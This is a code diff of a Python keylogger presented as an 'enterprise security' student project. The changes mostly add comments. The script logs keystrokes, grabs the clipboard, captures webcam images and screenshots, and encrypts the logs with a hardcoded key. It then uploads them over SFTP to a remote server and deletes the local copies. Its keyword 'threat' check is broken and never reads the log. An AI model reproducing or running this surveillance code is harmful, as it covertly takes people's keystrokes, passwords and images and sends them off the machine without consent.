@@ -37,7 +37,7 @@ remote_file = '/home/pi/transfer/'
 
 i = 0  # global variable to change the name of image as we click
 
-file_path = "D:\\Stuff\\D studies\\Adv dip of it\\Semester 5\\Applied projects\\Keylogger\\Project\\log_files"
+file_path = "D:\\Stuff\\D studies\\Adv dip of it\\Semester 5\\Applied projects\\Keylogger-for-Enterprise-Security\\Project\\log_files"
 extend = "\\"
 file_merge = file_path + extend
 
@@ -58,11 +58,12 @@ def copy_clipboard():
 copy_clipboard()
 
 
+# Captures Webcam using cv2 module
 def capture_webcam():
     camera = cv2.VideoCapture(0)
-    time_str = time.strftime("IMG_%Y%m%d_%H%M%S")
+    time_str = time.strftime("IMG_%Y%m%d_%H%M%S")  # To save each image with the time stamp
     check, frame = camera.read()
-    cv2.waitKey(0)
+    cv2.waitKey(0)  # waits 0 milliseconds after each keypress
     camera.release()
     cv2.imwrite(file_path + extend + time_str + camera_information, frame)
 
@@ -70,24 +71,24 @@ def capture_webcam():
 capture_webcam()
 
 
+# Capture Screenshots using imgrb or pyscreenshot module
 def screenshots():
     imgrb = ImageGrab.grab()
-    time_str = time.strftime("SGB_%Y%m%d_%H%M%S")
+    time_str = time.strftime("SGB_%Y%m%d_%H%M%S")  # To save each image with the time stamp
     imgrb.save(file_path + extend + time_str + screenshot_information)
 
 
 screenshots()
 
 
+# Encrypting all files in a specific directory using the fernet library
 def encrypt_files():
-    folderName = "D:\Stuff\D studies\Adv dip of it\Semester 5\Applied projects\Keylogger\Project\log_files"
-    encrypted_dir = f"{folderName}"
-    key = "BhbZu8TldX1E7eFjhfkppHVmbu7xZaW0XKMOI-eLXU4="  # enter key here
-    folders = [j for j in os.listdir(encrypted_dir) if os.path.isfile(os.path.join(encrypted_dir, j))]
+    key = "BhbZu8TldX1E7eFjhfkppHVmbu7xZaW0XKMOI-eLXU4="  # Key used to encrypt and decrypt the files
+    folders = [j for j in os.listdir(file_path) if os.path.isfile(os.path.join(file_path, j))]
 
     for j in folders:
         x = "\\"
-        z = encrypted_dir + x + j
+        z = file_path + x + j
         with open(z, 'rb') as f:
             data = f.read()
             fernet = Fernet(key)
@@ -95,24 +96,26 @@ def encrypt_files():
             with open(z, 'wb') as f:
                 f.write(encrypted)
                 print(z)
-                z = encrypted_dir
+                z = file_path
     print("files in folder encrypted")
 
 
+# Sftp the files to server
 def sftp_files():
     with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
         print("Connection Successfully Established")
         sftp.chdir(remote_file)
-        time_str = time.strftime("log_%Y%m%d_%H%M")
-        sftp.mkdir(time_str)
+        time_str = time.strftime("log_%Y%m%d_%H%M")  # creates a time stamp to be used
+        sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
         print("Directory created")
         sftp.chdir(time_str)
         slash = "/"
         new_path = sftp.pwd
-        sftp.put_d(file_path, new_path + slash, preserve_mtime=False)
+        sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
         sftp.close()
 
 
+# Delete files from the local pc or workstation
 def delete_files():
     for file_name in os.listdir(file_merge):
         file = file_merge + file_name
@@ -121,19 +124,18 @@ def delete_files():
             os.remove(file)
 
 
+# Read the log file to find any mentioned threats
 def read_file():
-    string1 = ['quick', 'brown', 'fox', 'jumps']
-    # opening a text file
+    string1 = ['quick', 'brown', 'fox', 'jumps']  # mentioned threats
+    # open text file
     file1 = open(file_merge + keys_information, "r")
-
-    # setting flag and index to 0
-    flag = 0
-    index = 0
 
     for line in string1:
         if any(word in line for word in string1):
             print(line)
             print("the word was found")
+        else:
+            print("the word is not found")
 
     # closing text file
     file1.close()
@@ -143,7 +145,7 @@ number_of_iterations = 0
 currentTime = time.time()
 stopTime = time.time() + time_iterations
 
-while number_of_iterations < number_of_iterations_end:
+while number_of_iterations < number_of_iterations_end:  # The keylogger will run until the maximum iteration is met
 
     count = 0
     keys = []
@@ -162,7 +164,7 @@ while number_of_iterations < number_of_iterations_end:
             write_file(keys)
             keys = []
 
-
+    # writes captured keylogs to a file
     def write_file(keys):
         with open(file_path + extend + keys_information, "a") as f:
             for key in keys:
@@ -174,17 +176,16 @@ while number_of_iterations < number_of_iterations_end:
                     f.write(k)
                     f.close()
 
-
     def on_release(key):
         if key == Key.esc:
             return False
         if currentTime > stopTime:
             return False
 
-
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
+    # order of the functions which will run one at a time
     if currentTime > stopTime:
         screenshots()
         copy_clipboard()
@@ -199,4 +200,3 @@ while number_of_iterations < number_of_iterations_end:
 
         currentTime = time.time()
         stopTime = time.time() + time_iterations
-
